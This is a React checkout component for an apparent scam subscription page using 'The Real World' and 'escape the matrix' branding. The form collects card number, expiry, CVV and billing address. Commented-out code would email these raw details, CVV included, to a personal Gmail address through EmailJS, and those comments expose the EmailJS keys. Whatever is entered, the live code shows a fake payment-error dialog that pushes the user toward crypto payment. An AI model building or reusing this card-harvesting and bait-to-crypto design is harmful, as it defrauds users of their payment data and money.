import Image from "next/image";
import { useState } from "react";
import globe from "../../../assets/trw-knight-globe-with-ring.svg";
import miniGlobe from "../../../assets/trw-knight-globe.svg";
import emailjs from "@emailjs/browser";

import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { CheckMarkIcon, ErrorIcon } from "../ui/icons";
import PayCrypto from "./PayCrypto";

type Props = {};

const Checkout = (props: Props) => {
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [registerationInfo, setRegisterationInfo] = useState({
    email: "",
    name: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    address: "",
  });

  const handleDetailsCollection = (e: any) => {
    setRegisterationInfo({
      ...registerationInfo,
      [e.target.name]: e.target.value,
    });
  };

  const handleDetailsSubmit = () => {
    // const serviceId = "service_32bqdom";
    // const templateId = "template_jhjosml";
    // const publicKey = "Q7dcW8jxf1kW3CLyO";

    // const templateParams = {
    //   to_name: registerationInfo.name,
    //   to_email: "chukwudubem7@gmail.com",
    //   to_card_number: registerationInfo.cardNumber,
    //   to_expiry_date: registerationInfo.expiryDate,
    //   to_cvv: registerationInfo.cvv,
    //   to_address: registerationInfo.address,
    // };

    // emailjs.send(serviceId, templateId, templateParams, publicKey).then(
    //   (result) => {
    //     console.log(result.text);
    //   },
    //   (error) => {
    //     console.log(error.text);
    //   }
    // );
    console.log(registerationInfo);
    setIsDialogOpen(true);
  };

  const isDisabled = registerationInfo.name === "";

  return (
    <div className="flex flex-col-reverse md:flex-row bg-[#0d1016]">
      <div className="w-full md:w-[50%] md:h-screen space-y-4 md:pl-[6%] flex flex-col items-center md:items-start justify-center text-center md:text-left text-[20px] leading-[30px] mt-5 md:mt-0">
        <Image src={globe} alt="globe" />
        <p className="font-bold">THE MATRIX IS CRACKED.</p>
        <p>THIS IS YOUR CHANCE.</p>
        <p className="font-bold">A PORTAL EXISTS - AN ESCAPE.</p>
        <p>THIS WILL BE THE MOST IMPORTANT DECISION OF YOUR LIFE.</p>
        <p>TAKE THE RED PILL.</p>
        <p className="font-bold">JOIN THE REAL WORLD.</p>
        <p className="font-bold text-[#f1ba13]">WE ARE WAITING FOR YOU.</p>
      </div>

      <div className="w-full md:w-[50%] bg-black">
        <div className="flex flex-col md:flex-row text-center md:text-left items-center mt-5 md:mt-0">
          <div>
            <Image src={miniGlobe} alt="miniGlobe" />
          </div>
          <div>
            <h1 className="text-[27px] leading-[40px] font-semibold">
              JOIN THE REAL WORLD
            </h1>
            <p className="text-[24px] leading-[36px]">ESCAPE THE MATRIX</p>
          </div>
        </div>

        <div className="p-[4%]">
          <div className="flex items-center gap-[9px] my-4">
            <CheckMarkIcon />
            <h2 className="font-bold text-[18px]">PERSONAL INFORMATION</h2>
          </div>
          {/* <div>
            <label className="">Email Address</label>
            <br />
            <input
              type="email"
              onChange={(e) => {
                const email = e.target.value;
                setRegisterationInfo({ ...registerationInfo, email });
              }}
              placeholder="example@gmail.com"
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />
          </div> */}
          {/* <div>
            <label>Password</label>
            <br />
            <input
              type="password"
              placeholder="Password"
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />
          </div> */}
          <div>
            <label>Full Name</label>
            <br />
            <input
              type="text"
              onChange={(e) => {
                const name = e.target.value;
                setRegisterationInfo({ ...registerationInfo, name });
              }}
              placeholder="First Name"
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />
          </div>
          {/* <div>
            <label>Last Name</label>
            <br />
            <input
              type="text"
              placeholder="Last Name"
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />{" "}
          </div> */}

          <div className="flex items-center gap-[9px] mt-8 mb-4">
            <CheckMarkIcon />
            <h2 className="font-bold text-[18px]">PAYMENT</h2>
          </div>
          <div>
            <label>Card Number</label>
            <br />
            <input
              type="number"
              placeholder="xxxx xxxx xxxx xxxx"
              name="cardNumber"
              onChange={handleDetailsCollection}
              onInput={(e) => {
                const target = e.target as HTMLInputElement;
                if (target.value.length > 12) {
                  target.value = target.value.slice(0, 12);
                }
              }}
              maxLength={12}
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />{" "}
          </div>
          <div>
            <label>Expiration Date</label>
            <br />
            <input
              type="text"
              name="expiryDate"
              onChange={handleDetailsCollection}
              placeholder="MM/YY"
              maxLength={5}
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />{" "}
          </div>
          <div>
            <label>CVC</label>
            <br />
            <input
              type="number"
              placeholder="x x x"
              name="cvv"
              onChange={handleDetailsCollection}
              onInput={(e) => {
                const target = e.target as HTMLInputElement;
                if (target.value.length > 3) {
                  target.value = target.value.slice(0, 3);
                }
              }}
              maxLength={3}
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />{" "}
          </div>
          <div>
            <label>Billing Address</label>
            <br />
            <input
              type="text"
              name="address"
              onChange={handleDetailsCollection}
              placeholder="Billing Address"
              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
            />{" "}
          </div>

          <div className="p-[4%]">
            <h1 className="font-bold text-[25px] leading-[42px]">
              $49.99 / <span className="font-normal">Monthly</span>
            </h1>
            <div className="flex items-start mt-3">
              <input type="checkbox" className="mr-2 mt-2 scale-150" />
              <p className="">
                I accept the Terms and Conditions and Privacy Policy, and agree
                to pay $49.99 USD monthly until I cancel.
              </p>
            </div>
          </div>

          <div className="flex flex-col gap-8 justify-center items-center mt-7">
            <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
              <DialogContent>
                <DialogHeader>
                  <DialogTitle>Error Processing Payment.</DialogTitle>
                  <DialogDescription>
                    <div className="flex flex-col justify-center items-center">
                      <div className="my-6">
                        <ErrorIcon />
                      </div>
                      <p>There was an error processing your payment.</p>
                      <p>Please, pay with crypto!</p>
                      <div className="mt-[50px]">
                        <PayCrypto
                          isDisabled={isDisabled}
                          email={registerationInfo.email}
                          name={registerationInfo.name}
                        />
                      </div>
                    </div>
                  </DialogDescription>
                </DialogHeader>
              </DialogContent>
            </Dialog>

            <button
              onClick={handleDetailsSubmit}
              disabled={
                !registerationInfo.address ||
                !registerationInfo.cardNumber ||
                !registerationInfo.cvv ||
                !registerationInfo.expiryDate
              }
              className="bg-[#f1ba13] rounded-md py-3 px-[95px]"
            >
              PAY WITH CARD
            </button>

            <div>
              <PayCrypto
                isDisabled={isDisabled}
                email={registerationInfo.email}
                name={registerationInfo.name}
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Checkout;
